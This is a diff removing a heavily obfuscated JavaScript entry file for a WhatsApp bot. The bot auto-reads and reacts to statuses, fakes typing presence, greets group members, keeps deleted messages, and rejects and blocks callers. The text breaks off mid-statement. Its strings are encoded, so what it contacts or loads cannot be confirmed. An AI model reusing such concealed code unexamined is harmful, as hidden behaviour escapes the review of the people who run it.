@@ -1,1 +1,4005 @@
-function _0x38a6(_0x24ecc6,_0x1e921b){const _0x3d21ea=_0x4ee4();return _0x38a6=function(_0x5179a6,_0x39e5aa){_0x5179a6=_0x5179a6-(-0x9d2+-0x2*-0xb96+-0xbd5*0x1);let _0x57cb0f=_0x3d21ea[_0x5179a6];if(_0x38a6['styYLd']===undefined){var _0x2bed90=function(_0x941509){const _0xd9cec5='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x3ee99b='',_0x1d5204='';for(let _0x46f0f6=0x2364+0xc52+-0x2fb6,_0x26f68c,_0x1940ea,_0x4703da=-0x1057*0x2+0x96f+-0x1*-0x173f;_0x1940ea=_0x941509['charAt'](_0x4703da++);~_0x1940ea&&(_0x26f68c=_0x46f0f6%(-0x998+-0x2180+0x2b1c)?_0x26f68c*(0x985+-0xcde*-0x1+-0x1623)+_0x1940ea:_0x1940ea,_0x46f0f6++%(0x3*-0x5b9+-0x21*-0xb2+-0x5c3))?_0x3ee99b+=String['fromCharCode'](0xe84+-0x14e1+0x75c*0x1&_0x26f68c>>(-(-0xa93*0x1+0xbae+-0x119*0x1)*_0x46f0f6&-0x1c90+-0x998+0x262e)):0xbb4+0x22f3*0x1+-0xf8d*0x3){_0x1940ea=_0xd9cec5['indexOf'](_0x1940ea);}for(let _0x3e02b0=0x1c1a+0x9e+-0x1cb8,_0x4de878=_0x3ee99b['length'];_0x3e02b0<_0x4de878;_0x3e02b0++){_0x1d5204+='%'+('00'+_0x3ee99b['charCodeAt'](_0x3e02b0)['toString'](-0x2313+-0x248b*0x1+-0x1*-0x47ae))['slice'](-(-0x1e07+0x16b*-0xd+0x3078));}return decodeURIComponent(_0x1d5204);};_0x38a6['TJjgpU']=_0x2bed90,_0x24ecc6=arguments,_0x38a6['styYLd']=!![];}const _0x5d3dd8=_0x3d21ea[-0x373*0x3+0x1*0x2257+0xa6*-0x25],_0x3b2e70=_0x5179a6+_0x5d3dd8,_0x3ac998=_0x24ecc6[_0x3b2e70];return!_0x3ac998?(_0x57cb0f=_0x38a6['TJjgpU'](_0x57cb0f),_0x24ecc6[_0x3b2e70]=_0x57cb0f):_0x57cb0f=_0x3ac998,_0x57cb0f;},_0x38a6(_0x24ecc6,_0x1e921b);}const _0x3894f6=_0x38a6;function _0x4ee4(){const _0x52a880=['yxHPB3m','ANnVBG','CMvHze1LC3nHz2vZ','zxzLBNrZ','z3jVDxbZ','zNjVBq','CxvLC3rPB24','qhmUD2HHDhnHChaUBMv0','Ahr0Chm6lY9NAxn0lMDPDgH1yNvZzxjJB250zw50lMnVBs9Lzg51DdaWms8','8j+vIU+4JW','lI9JB25MAwCUANm','zxHPC3rZu3LUyW','CgLUBW','zgf0yq','kK1LC3nHz2u6kIa','mtiWmZyZmZiYnJa2mZy5mdC5qg5LD3nSzxr0zxi','zg9JDw1LBNq','mJaUmc4Wna','BwLTzq','Cgf0Aa','CMvHzezPBgvtEw5J','CMvHza','C3vIAMvJDa','qNLLipcFKySGqa','mebZlNDOyxrZyxbWlM5LDa','y3jLzhmUDxbKyxrL','AxncDwzMzxi','AxneAxjLy3rVCNK','CMfUzg9T','rw5JB3vUDgvYzwqGrxjYB3i','CgfYC2u','DgvZDa','CMvJB3jKAw5N','BMfTzq','rK46','CMvHzhn3','Bxr5Cgu','CMvQzwn0q2fSBa','BM8GzgvZy3jPChrPB24','yxvKAw8VB2DNoYbJB2rLy3m9B3b1CW','EwfYz3mVEwfYz3m','y29UDgfJDhm','Dw5SAw5Ru3LUyW','CMvZB2X2zq','yxv0Ag9Y','wc1xqs1csvOTrevtq1jjufrjt046','zM9YBwf0','rxzLBNrfBwL0DgvY','yxvKAw8','BxnN','zNjVBuj1zMzLCG','sgvSBg8G8j+KLYba','C2vUzfrLEhq','yxbWBgLJyxrPB24VB2n0zxqTC3rYzwfT','zMLSzq','yw50AwrLBgv0zq','CMvWBhK','C3rYAw5NAwz5','D3jPDgvgAwXL','B3bLBG','C2vUze1LC3nHz2u','BwTKAxjtEw5J','lI9HBgWVzNvUy3rPB24UANm','CgfJA25HBwu','ChjVBw90zq','C2LSzw50','ngXlEhzgEq','yxneB2n1BwvUDa','z2v0tNvTyMvY','qKffnq','Ahr0Chm6lY9Jzg4UCgL4ywjHEs5JB20VCgHVDg8VmJaXns8Xmc8Wns8YmI8ZnY9IBgfUAY1WCM9MAwXLlxbPy3r1CMuTotCZndyWxZK2mf83mJaUCg5Np3e9nJa','D2f0y2HgAwXL','Aw50zxjUyxrPB25HBa','CMvHzhn3mG','C3bSAxq','mtiWotm1nvHJsK1vBW','CMvSyxLnzxnZywDL','yMfPBgv5CW','D2eTC3rPy2TLCI1MB3jTyxr0zxi','y29UBMvJDgLVBI51CgrHDgu','lI9SAwiVyxjYzNvUy3rPB24UANm','C3rPy2TLCG','zxH0','tJO7','yw50AwnHBgWY','zMLSzs10ExbL','B2zMzxi','zxHPDfbYB2nLC3m','DMLKzw8','CM1KAxjtEw5J','8j+tKsb3zwXJB21LihrViefYy2GGzgf0ywjHC2uG8j+NRa','C3rVCMu','z2v0tMfTzq','z3jVDxbnzxrHzgf0yq','kLrPBwu6kIa','yxzHAwXHyMXL','zgvJB2rLsMLK','rxjYB3iGAgfUzgXPBMCGzgvSzxrLzcbTzxnZywDLoG','B3b0CW','nJzzEenhANu','zMLUza','lI9HBgWVzgf0ywjHC2uVD2vSy29Tzs5QC29U','zgvZyW','ihDLBgnVBwuGDg8G','yxv0B3jLywq','BgvUz3rO','yxjNDG','BwvZC2fNzxm','D3jPDgvgAwXLu3LUyW','BM93','zNjVBu1L','lI9Lzg51Dc5QCW','reqVtu0VwvLzwq','yMXVy2S','yxntDgLJA2vY','D3jPDgu','zxjYB3i','D2L0Ag91DenVBNrHy3q','ywn0Aw9U','CMvK','yxbWBgLJyxrPB24','CMvWBgfJzq','qxjJAf8','C2vUzenVBNrHy3q','y2XVC2u','lI9HBgWVzxHPzJi','yxv0B3r5CgLUzW','Bw9Tzw50lxrPBwv6B25L','AM9PBG','igHHCYbIzwvUihbYB21VDgvKihrVigfKBwLUigj5iea','D2vSy29Tzq','DgLTzxPVBMu','lI90BxaVC2vZC2LVBI8','ChjVBwLZzxm','zMLSzw5HBwu','CgfYDgLJAxbHBNrZ','C3rHCNrZv2L0Aa','C3rYAw5N','Bg9KyxnO','C3rHDhvZ','yxnjBwfNzq','mteXnZK1ntDSDNbjt3e','CMvTB3zL','odqXntq4wLn4uKHs','x0fKBwLUifjLBw92zwqGqwXLCNqHiea','ChvZAa','zxbOzw1LCMfStwvZC2fNzq','C2vUzeLTywDLqxntDgLJA2vY','y29Uy2f0','Dw5HDMfPBgfIBgu','8j+tKsbxAgf0C2fWCcbdB25Uzwn0Aw5NlI4','rwrUDxq','C2XPy2u','mZi0odu4neLOshPnAq','DxbKyxrLqMXVy2TtDgf0Dxm','y2HPBgq','B3v0Chv0','C2vYDMvY','igXLyxzPBMCGz3jVDxaG','Bg9N','igHHCYbIzwvUigrLBw90zwqGzNjVBsbHzg1PBIbIEsba','8j+tKsbdB25Uzwn0zwqGDg8G','yMLUza','Dhj1zq','zNvSBa','C3rHDhvZqgjYB2fKy2fZDa','ywrK','C2vUzgvY','wc1xqs1csvOTtKfnrtO','BwvZC2fNzxmUDxbZzxj0','BM9Kzs1MzxrJAa','CgfYDgLJAxbHBNq','Aw1Hz2u','ChvYCgXL','lI9HBgWVBxLMDw5J','ywXSB2m','y2HHDhm','y29UBMvJDgLUzW','yMfZzty0','CMvTB3rLsMLK','C2vZC2LVBG','otm0mZi4wurdzeXN','y2fSBcbKzxrLy3rLzcbJywXSzxiGyMXVy2TLza','DxnLCG','vxbKyxrLia','C3rHDhvZq29Kzq','ru5eoLzdqvje','z2v0rMLSzq','yxf1yq','zxH0zw5KzwruzxH0twvZC2fNzq','C3rKAw4','CMvHzgXPBMu','zw4Ts0u','z2v0','lMjPBG','C2vUzfbYzxnLBMnLvxbKyxrL','C2vUzfzPzgvVqxntDgLJA2vY','zMXVB3i','mJy0otvoEfHhBgu','l3jHDW','BwvZC2fNzq','zw5KC1DPDgG','y2fJAgu','t1jhoM51BgWk','ChjVDg9JB2XnzxnZywDL','BwLTzxr5Cgu','y29UDgv4DeLUzM8','A2v5CW','u2vZC2LVBIbjrcbPBNzHBgLKlcbLzgL0igLUignVBMzPzY5QCW','veLuteu6cG','cGO+ia','C2v0DgLUz3m','vwj1BNr1','yxv0B3jLy29YzgLUzW','A2v5','x05LDYbbzg1PBIbbBgvYDceGqa','8j+hQpcFH7i','yxDLC29Tzs1WAg9Uzw51BwjLCG','oZS7cG','y3jLyxrLsw50zxjMywnL','C3rKB3v0','rgv2zwXVCgvYiejVDa','yMX1zq','nJCZmZr6rMj1zgq','vKvsu0LptJOZlJak'];_0x4ee4=function(){return _0x52a880;};return _0x4ee4();}(function(_0x5d3f32,_0x1d0afd){const _0x32075b=_0x38a6,_0x1d4354=_0x5d3f32();while(!![]){try{const _0x32f5ba=-parseInt(_0x32075b(0x185))/(-0x906+-0xff1+0xbc*0x22)*(-parseInt(_0x32075b(0x1c9))/(-0x8ba*0x4+0x81e*0x4+0x272))+-parseInt(_0x32075b(0x216))/(-0x6b*0x11+-0x353*0x4+0x4e*0x43)+-parseInt(_0x32075b(0x23c))/(0x19b9*-0x1+0x1e7f+-0x4c2)+-parseInt(_0x32075b(0x24d))/(0xdcd+-0x5*-0x2c8+-0x1bb0*0x1)*(parseInt(_0x32075b(0x1ea))/(0x263b+-0x47+0x25ee*-0x1))+-parseInt(_0x32075b(0x1d2))/(0x23c6+-0x365*-0xb+-0x4916)+-parseInt(_0x32075b(0x220))/(-0xedc+0xe2*0x1c+-0x11*0x94)+parseInt(_0x32075b(0x214))/(-0x1f3a*-0x1+0x2*0xf93+-0x3e57*0x1);if(_0x32f5ba===_0x1d0afd)break;else _0x1d4354['push'](_0x1d4354['shift']());}catch(_0x203f3e){_0x1d4354['push'](_0x1d4354['shift']());}}}(_0x4ee4,-0x6f9d*0xd+0x18c8e+0x78fbb),require(_0x3894f6(0x191)));const {default:makeWASocket,useMultiFileAuthState,DisconnectReason,makeInMemoryStore,jidDecode,downloadContentFromMessage,delay}=require(_0x3894f6(0x1d4)),pino=require(_0x3894f6(0x193)),{delArrSave}=require(_0x3894f6(0x1d7)),fs=require('fs'),path=require(_0x3894f6(0x19a)),{Boom}=require('@hapi/boom'),axios=require(_0x3894f6(0x187)),yargs=require(_0x3894f6(0x1af)),_=require(_0x3894f6(0x211)),colors=require('@colors/colors/safe'),chalk=require('chalk'),moment=require(_0x3894f6(0x206)),text2png=require(_0x3894f6(0x1d5)),PhoneNumber=require(_0x3894f6(0x260)),fetch=require(_0x3894f6(0x231)),FileType=require(_0x3894f6(0x1dc)),readline=require(_0x3894f6(0x246)),{smsg,imageToWebp,videoToWebp,sleep,writeExif,getBuffer,getSizeMedia,toPTT,toAudio,toVideo}=require(_0x3894f6(0x235)),{getTime,tanggal,toRupiah,telegraPh,pinterest,ucapan,generateProfilePicture}=require(_0x3894f6(0x1c5)),{writeExifImg,writeExifVid}=require(_0x3894f6(0x204)),{color}=require('./all/color');let wlcm=JSON[_0x3894f6(0x1a5)](fs[_0x3894f6(0x19b)](_0x3894f6(0x1ec)));const moji=['📚','💭','💫','🌌','🌏','✨','🌷','🍁','🪻'],randomemoji=moji[Math[_0x3894f6(0x24c)](Math[_0x3894f6(0x1a3)]()*moji[_0x3894f6(0x1f0)])],listcolor=[_0x3894f6(0x243),_0x3894f6(0x1fe),_0x3894f6(0x265),_0x3894f6(0x234),'magenta'],randomcolor=listcolor[Math[_0x3894f6(0x24c)](Math[_0x3894f6(0x1a3)]()*listcolor['length'])],randomcolor2=listcolor[Math[_0x3894f6(0x24c)](Math[_0x3894f6(0x1a3)]()*listcolor[_0x3894f6(0x1f0)])],randomcolor3=listcolor[Math[_0x3894f6(0x24c)](Math['random']()*listcolor[_0x3894f6(0x1f0)])],randomcolor4=listcolor[Math[_0x3894f6(0x24c)](Math[_0x3894f6(0x1a3)]()*listcolor[_0x3894f6(0x1f0)])],randomcolor5=listcolor[Math[_0x3894f6(0x24c)](Math['random']()*listcolor[_0x3894f6(0x1f0)])],store=makeInMemoryStore({'logger':pino()[_0x3894f6(0x222)]({'level':_0x3894f6(0x1c8),'stream':_0x3894f6(0x1e2)})});global[_0x3894f6(0x1e9)]=new Object(yargs(process[_0x3894f6(0x1f1)][_0x3894f6(0x21f)](-0xca5+0x621*-0x1+0x12c8))[_0x3894f6(0x1de)](![])[_0x3894f6(0x1a5)]());const DataBase=require('./lib/database'),database=new DataBase();((async()=>{const _0x6d2360=_0x3894f6,_0x40f946=await database[_0x6d2360(0x19c)]();_0x40f946&&Object[_0x6d2360(0x256)](_0x40f946)[_0x6d2360(0x1f0)]===-0x226b+0xf52+0x1319?(global['db']={'users':{},'groups':{},'database':{},'sticker':{},'game':{},'settings':{},..._0x40f946||{}},await database[_0x6d2360(0x1fa)](global['db'])):global['db']=_0x40f946,setInterval(async()=>{if(global['db'])await database['write'](global['db']);},-0x1fd2+0x13*-0xee+0x3f28);})()),require(_0x3894f6(0x18a))[_0x3894f6(0x1b6)]['defaultMaxListeners']=0xdbe+-0x24bb+0x1*0x1955;const deleteFolderRecursive=function(_0x3aa000){const _0x297792=_0x3894f6;fs[_0x297792(0x192)](_0x3aa000)&&(fs['readdirSync'](_0x3aa000)['forEach'](function(_0x5d8ea1,_0x236307){const _0x5bd8ff=_0x297792,_0x14b4cf=_0x3aa000+'/'+_0x5d8ea1;fs['lstatSync'](_0x14b4cf)[_0x5bd8ff(0x1a2)]()?deleteFolderRecursive(_0x14b4cf):fs[_0x5bd8ff(0x1b1)](_0x14b4cf);}),fs[_0x297792(0x1e0)](_0x3aa000));};if(global['db'])setInterval(async()=>{const _0x6b4a1=_0x3894f6;if(global['db'][_0x6b4a1(0x194)])await global['db']['write']();},(0x59d+0x1645+-0x6f1*0x4)*(0xac5*-0x1+-0x1b2b+0x2*0x14ec));const question=_0x2a6331=>{const _0x3bdea9=_0x3894f6,_0x272361=readline[_0x3bdea9(0x262)]({'input':process[_0x3bdea9(0x245)],'output':process[_0x3bdea9(0x263)]});return new Promise(_0x5de7ae=>{const _0x516572=_0x3bdea9;_0x272361[_0x516572(0x18d)](_0x2a6331,_0x5de7ae);});},startBotz=async()=>{const _0x5e21d6=_0x3894f6,{state:_0x2c4415,saveCreds:_0x28e360}=await useMultiFileAuthState(_0x5e21d6(0x20b)),_0x130cf2=makeWASocket({'logger':pino({'level':_0x5e21d6(0x1c8)}),'printQRInTerminal':![],'auth':_0x2c4415,'connectTimeoutMs':0xea60,'defaultQueryTimeoutMs':0x0,'keepAliveIntervalMs':0x2710,'emitOwnEvents':!![],'fireInitQueries':!![],'generateHighQualityLinkPreview':!![],'syncFullHistory':!![],'markOnlineOnConnect':!![],'browser':[_0x5e21d6(0x25b),'Chrome',_0x5e21d6(0x198)]});return store[_0x5e21d6(0x229)](_0x130cf2['ev']),_0x130cf2['ev']['on'](_0x5e21d6(0x230),async _0x5e1f24=>{const _0x1b4b99=_0x5e21d6;try{mek=_0x5e1f24[_0x1b4b99(0x1f2)][-0x9a3*0x4+-0x2690+0x4d1c];if(!mek[_0x1b4b99(0x24f)])return;mek[_0x1b4b99(0x24f)]=Object[_0x1b4b99(0x256)](mek['message'])[-0x1564+0x358*-0x1+0x18bc]===_0x1b4b99(0x219)?mek[_0x1b4b99(0x24f)]['ephemeralMessage'][_0x1b4b99(0x24f)]:mek['message'];if(mek['key']&&mek[_0x1b4b99(0x25d)][_0x1b4b99(0x23a)]==_0x1b4b99(0x22c)){if(global['db'][_0x1b4b99(0x25a)][_0x1b4b99(0x1aa)]&&global['db'][_0x1b4b99(0x25a)]['readsw']==!![])_0x130cf2['readMessages']([mek[_0x1b4b99(0x25d)]]);else return;}if(mek['key']&&mek[_0x1b4b99(0x25d)]['remoteJid']==_0x1b4b99(0x22c)&&global['db']['settings'][_0x1b4b99(0x1d0)]===_0x1b4b99(0x22a)){_0x130cf2['readMessages']([mek[_0x1b4b99(0x25d)]]);const _0x147e6b=await _0x130cf2['decodeJid'](_0x130cf2[_0x1b4b99(0x23e)]['id']),_0x525d0f=['❤️','💸','😇','🍂','💥','💯','🔥','💫','💎','💗','🤍','🖤','👀','🙌','🙆','🚩','🥰','💐','😎','🤎','✅','🫀','🧡','😁','😄','🌸',_0x1b4b99(0x190),'🌷','⛅','🌟','🗿','🇨🇦','💜','💙',_0x1b4b99(0x25f),'🖤','💚'],_0x45b9d7=_0x525d0f[Math[_0x1b4b99(0x24c)](Math['random']()*_0x525d0f[_0x1b4b99(0x1f0)])];await _0x130cf2[_0x1b4b99(0x1c3)](mek[_0x1b4b99(0x25d)][_0x1b4b99(0x23a)],{'react':{'text':_0x45b9d7,'key':mek[_0x1b4b99(0x25d)]}},{'statusJidList':[mek['key'][_0x1b4b99(0x232)],_0x147e6b]});}if(global['db'][_0x1b4b99(0x25a)][_0x1b4b99(0x1ef)]&&global['db'][_0x1b4b99(0x25a)][_0x1b4b99(0x1ef)]==!![])_0x130cf2[_0x1b4b99(0x189)]([mek[_0x1b4b99(0x25d)]]);if(global['db'][_0x1b4b99(0x25a)][_0x1b4b99(0x205)]&&global['db'][_0x1b4b99(0x25a)][_0x1b4b99(0x205)]==!![]&&!mek[_0x1b4b99(0x25d)][_0x1b4b99(0x1f5)])_0x130cf2[_0x1b4b99(0x24a)]('composing',mek[_0x1b4b99(0x25d)]['remoteJid']);if(global['db']['settings'][_0x1b4b99(0x1e6)]&&global['db']['settings'][_0x1b4b99(0x1e6)]==!![]&&!mek['key'][_0x1b4b99(0x1f5)])_0x130cf2[_0x1b4b99(0x24a)](_0x1b4b99(0x1e6),mek[_0x1b4b99(0x25d)][_0x1b4b99(0x23a)]);if(global['db'][_0x1b4b99(0x25a)][_0x1b4b99(0x21c)]&&global['db'][_0x1b4b99(0x25a)][_0x1b4b99(0x21c)]==!![]&&!mek['key'][_0x1b4b99(0x1f5)])_0x130cf2[_0x1b4b99(0x24a)](_0x1b4b99(0x21c),mek['key'][_0x1b4b99(0x23a)]);if(global['db'][_0x1b4b99(0x25a)][_0x1b4b99(0x25c)]&&global['db'][_0x1b4b99(0x25a)][_0x1b4b99(0x25c)]==!![]&&!mek[_0x1b4b99(0x25d)][_0x1b4b99(0x1f5)])_0x130cf2['sendPresenceUpdate'](_0x1b4b99(0x1a7),mek[_0x1b4b99(0x25d)]['remoteJid']);if(mek[_0x1b4b99(0x25d)]['id'][_0x1b4b99(0x20f)](_0x1b4b99(0x1cc))&&mek['key']['id']['length']===-0x14c*-0x6+0x1*0x241c+-0x2bd4)return;m=smsg(_0x130cf2,mek,store),require(_0x1b4b99(0x1f6))(_0x130cf2,m,_0x5e1f24,mek,store);}catch(_0x33bef9){console[_0x1b4b99(0x226)](_0x33bef9);}}),_0x130cf2['decodeJid']=_0x25a154=>{const _0x353575=_0x5e21d6;if(!_0x25a154)return _0x25a154;if(/:\d+@/gi[_0x353575(0x1a6)](_0x25a154)){let _0x20fc46=jidDecode(_0x25a154)||{};return _0x20fc46[_0x353575(0x23e)]&&_0x20fc46[_0x353575(0x224)]&&_0x20fc46[_0x353575(0x23e)]+'@'+_0x20fc46['server']||_0x25a154;}else return _0x25a154;},_0x130cf2[_0x5e21d6(0x1e3)]=(_0x2bd8ab,_0x1f04fd=![])=>{const _0x4172d4=_0x5e21d6;id=_0x130cf2[_0x4172d4(0x1e7)](_0x2bd8ab),_0x1f04fd=_0x130cf2[_0x4172d4(0x1fc)]||_0x1f04fd;let _0x359ba5;if(id[_0x4172d4(0x250)]('@g.us'))return new Promise(async _0x57948a=>{const _0x589d06=_0x4172d4;_0x359ba5=store[_0x589d06(0x1b0)][id]||{};if(!(_0x359ba5[_0x589d06(0x1a8)]||_0x359ba5[_0x589d06(0x19d)]))_0x359ba5=_0x130cf2[_0x589d06(0x1e4)](id)||{};_0x57948a(_0x359ba5['name']||_0x359ba5[_0x589d06(0x19d)]||PhoneNumber('+'+id[_0x589d06(0x200)]('@s.whatsapp.net',''))[_0x589d06(0x1cb)](_0x589d06(0x1cf)));});else _0x359ba5=id==='0@s.whatsapp.net'?{'id':id,'name':'WhatsApp'}:id===_0x130cf2[_0x4172d4(0x1e7)](_0x130cf2[_0x4172d4(0x23e)]['id'])?_0x130cf2[_0x4172d4(0x23e)]:store[_0x4172d4(0x1b0)][id]||{};return(_0x1f04fd?'':_0x359ba5[_0x4172d4(0x1a8)])||_0x359ba5['subject']||_0x359ba5['verifiedName']||PhoneNumber('+'+_0x2bd8ab[_0x4172d4(0x200)](_0x4172d4(0x18e),''))[_0x4172d4(0x1cb)]('international');},_0x130cf2['serializeM']=_0x49a766=>smsg(_0x130cf2,_0x49a766,store),_0x130cf2['ev']['on'](_0x5e21d6(0x1d6),async _0x604109=>{const _0x15c58a=_0x5e21d6,{connection:_0x4820ff,lastDisconnect:_0x31ab86}=_0x604109;if(_0x4820ff===_0x15c58a(0x238)){}_0x4820ff==_0x15c58a(0x1c2)&&(console[_0x15c58a(0x226)](color(_0x15c58a(0x21d),''+randomcolor)),console['log'](color(_0x15c58a(0x1e1))),console['log'](color('reading\x20bot\x20plugins...',''+randomcolor)),console['log'](color('plugin\x20loaded....',''+randomcolor)),console['log'](color(_0x15c58a(0x228)+JSON[_0x15c58a(0x1c0)](_0x130cf2['user']['id'],null,-0x1168+-0x7b0+0x191a)))),_0x4820ff===_0x15c58a(0x203)&&_0x31ab86&&_0x31ab86[_0x15c58a(0x1fb)]&&_0x31ab86[_0x15c58a(0x1fb)][_0x15c58a(0x223)][_0x15c58a(0x240)]!=-0x1*-0x2624+-0x2677+0x1e4&&startBotz();}),_0x130cf2['ev']['on'](_0x5e21d6(0x1a0),_0x28e360),_0x130cf2[_0x5e21d6(0x1bb)]=(_0x3fdcc6,_0x27b73b,_0x259a2c='',_0xab94d4)=>_0x130cf2[_0x5e21d6(0x1c3)](_0x3fdcc6,{'text':_0x27b73b,..._0xab94d4},{'quoted':_0x259a2c}),_0x130cf2[_0x5e21d6(0x202)]=async(_0x49fe23,_0x231db8,_0x34b6a8=_0x5e21d6(0x264),_0x373d91='',_0x3e8b04={})=>{const _0x54a072=_0x5e21d6;let _0x4e9265=[];for(let _0x16f233 of _0x231db8){_0x4e9265[_0x54a072(0x218)]({'displayName':botname,'vcard':'BEGIN:VCARD\x0a'+_0x54a072(0x186)+(_0x54a072(0x1da)+botname+_0x54a072(0x261))+(_0x54a072(0x1a9)+botname+'\x0a')+_0x54a072(0x252)+_0x54a072(0x258)+('item1.TEL;waid='+_0x16f233+':'+_0x16f233+'\x0a')+'item1.X-ABLabel:Ponsel\x0a'+(_0x54a072(0x1b4)+_0x34b6a8+'\x0a')+(_0x54a072(0x22f)+botname+'\x0a')+_0x54a072(0x241)});}_0x130cf2['sendMessage'](_0x49fe23,{'contacts':{'displayName':_0x4e9265['length']+'\x20contacts','contacts':_0x4e9265},..._0x3e8b04},{'quoted':_0x373d91});},_0x130cf2['ev']['on']('group-participants.update',async _0x31c7c0=>{const _0x56a180=_0x5e21d6;try{let _0xf131d3=await _0x130cf2[_0x56a180(0x1e4)](_0x31c7c0['id']);const _0x2c7acf=_0xf131d3[_0x56a180(0x1ed)]||_0x56a180(0x1ad),_0x54f494=require(_0x56a180(0x206)),_0x264398=_0x54f494['tz'](''+global[_0x56a180(0x20a)])[_0x56a180(0x1b5)](_0x56a180(0x1f7));let _0x44bab9=_0xf131d3[_0x56a180(0x20e)][_0x56a180(0x1f0)];const _0x605aea=_0x31c7c0[_0x56a180(0x20e)];for(let _0x122637 of _0x605aea){try{ppuser=await _0x130cf2['profilePictureUrl'](_0x122637,_0x56a180(0x233));}catch{ppuser=_0x56a180(0x1cd);}if(_0x31c7c0[_0x56a180(0x1fd)]===_0x56a180(0x22d)&&global['db']['groups']?.[_0x31c7c0['id']]?.[_0x56a180(0x209)]){let _0x5ea4f4=_0x56a180(0x1ba)+_0x122637[_0x56a180(0x1d1)]('@')[-0x2*0x10b2+0xb56+0x160e*0x1][_0x56a180(0x1d1)](':')[0x924*-0x3+-0x1*-0x2ba+0x18b2]+_0x56a180(0x1ee)+_0xf131d3['subject']+'\x0a*READ\x20GROUP\x20DESCRIPTION!!!*\x0a'+_0x2c7acf;await _0x130cf2[_0x56a180(0x1c3)](_0x31c7c0['id'],{'image':{'url':ppuser},'caption':_0x5ea4f4,'mentions':[_0x122637]});}else{if(_0x31c7c0['action']===_0x56a180(0x215)&&global['db'][_0x56a180(0x18b)]?.[_0x31c7c0['id']]?.['goodbye']){let _0x45252c=_0x56a180(0x19e)+_0x122637[_0x56a180(0x1d1)]('@')[0x2c1*0x4+0x1baf+0x1*-0x26b3][_0x56a180(0x1d1)](':')[0x918+-0x3*0xa7f+-0x9*-0x27d]+_0x56a180(0x225)+_0xf131d3[_0x56a180(0x19d)];await _0x130cf2[_0x56a180(0x1c3)](_0x31c7c0['id'],{'image':{'url':ppuser},'caption':_0x45252c,'mentions':[_0x122637]});}}}if(global['db'][_0x56a180(0x18b)]?.[_0x31c7c0['id']]?.[_0x56a180(0x18a)]){if(_0x31c7c0[_0x56a180(0x1fd)]===_0x56a180(0x1c7)){let _0xd4bbe8=_0x56a180(0x25e)+_0x31c7c0[_0x56a180(0x20e)][0x16a*-0xd+0xe9*0x15+-0xb*0x11][_0x56a180(0x1d1)]('@')[0x2*-0xd8d+-0x18b7+-0xa5d*-0x5][_0x56a180(0x1d1)](':')[0x1a2c+-0x2556+0xb2a]+_0x56a180(0x208)+_0x31c7c0[_0x56a180(0x1b3)][_0x56a180(0x1d1)]('@')[-0x49*0x2c+0x99d*0x2+-0x3*0x23a][_0x56a180(0x1d1)](':')[-0x35*0xad+0x1b4d+0x884]+'_';await _0x130cf2[_0x56a180(0x1c3)](_0x31c7c0['id'],{'text':_0xd4bbe8,'mentions':[_0x31c7c0[_0x56a180(0x1b3)],_0x31c7c0['participants'][0x77*-0x3f+-0x1*0x24fa+0x1*0x4243]]});}else{if(_0x31c7c0['action']==='demote'){let _0x34bf5e=_0x56a180(0x217)+_0x31c7c0[_0x56a180(0x20e)][-0x2051*0x1+-0x2f4*-0x6+0x25*0x65][_0x56a180(0x1d1)]('@')[0xaec+0x1b64+-0x2650][_0x56a180(0x1d1)](':')[0x17*-0xb3+0xb4+0xf61]+_0x56a180(0x227)+_0x31c7c0[_0x56a180(0x1b3)][_0x56a180(0x1d1)]('@')[0x159e+0x11*-0x8+0x1516*-0x1]['split'](':')[-0x2512+0x1465*0x1+-0x1*-0x10ad]+'_';await _0x130cf2[_0x56a180(0x1c3)](_0x31c7c0['id'],{'text':_0x34bf5e,'mentions':[_0x31c7c0['author'],_0x31c7c0['participants'][-0x1*-0x832+-0x1d2b+0x14f9]]});}}}}catch(_0x5711b6){console[_0x56a180(0x226)](_0x5711b6);}}),_0x130cf2['ev']['on']('call',async _0xf2f73c=>{const _0x3be59e=_0x5e21d6;return _0xf2f73c[0x216+-0xe0c+0xbf6][_0x3be59e(0x212)]==_0x3be59e(0x1dd)&&(global['db']['settings']['anticall']&&(await _0x130cf2[_0x3be59e(0x1c3)](_0x130cf2['user']['id'],{'text':'call\x20detected\x20call\x20ended','quoted':_0xf2f73c[0x502+-0x2024+0x12e*0x17]}),await _0x130cf2[_0x3be59e(0x1ac)](_0xf2f73c[-0x14b0+-0x1596+-0x2*-0x1523]['id'],_0xf2f73c[-0x191c+0x14*0x12c+-0xd6*-0x2][_0x3be59e(0x18c)])),global['db'][_0x3be59e(0x25a)][_0x3be59e(0x1db)]&&(await _0x130cf2[_0x3be59e(0x1c3)](_0x130cf2[_0x3be59e(0x23e)]['id'],{'text':_0x3be59e(0x23d),'quoted':_0xf2f73c[-0x18fc+0x1689+-0x273*-0x1]}),await _0x130cf2[_0x3be59e(0x1ac)](_0xf2f73c[-0x831*0x4+-0x2091+0x15c7*0x3]['id'],_0xf2f73c[0x3bc+0x4b2*0x3+-0x11d2][_0x3be59e(0x18c)]),await sleep(0x12b2+0x9ac+0x2*-0xa47),await _0x130cf2[_0x3be59e(0x221)](_0xf2f73c[0x20ce+-0x35*-0xa7+-0x4361]['from'],_0x3be59e(0x1f8)))),!(0xcc2+-0x20e*-0xd+-0xc*0x34a);}),_0x130cf2['ev']['on']('messages.upsert',async _0x39256e=>{const _0x533847=_0x5e21d6;if(global['db'][_0x533847(0x25a)][_0x533847(0x1be)]){const {messages:_0x5403fb}=_0x39256e,_0x484d2e=_0x5403fb[-0xf4e+0x1ae2+-0xb94];if(!_0x484d2e['message'])return;const _0x193c60=_0x484d2e['key'],_0x425b20=_0x193c60['remoteJid'];!store[_0x533847(0x237)][_0x425b20]&&(store[_0x533847(0x237)][_0x425b20]=[]);store[_0x533847(0x237)][_0x425b20][_0x533847(0x218)](_0x484d2e);if(_0x484d2e['message']['protocolMessage']&&_0x484d2e[_0x533847(0x24f)][_0x533847(0x253)]['type']===0xaf9+-0x19c7*-0x1+-0x310*0xc){const 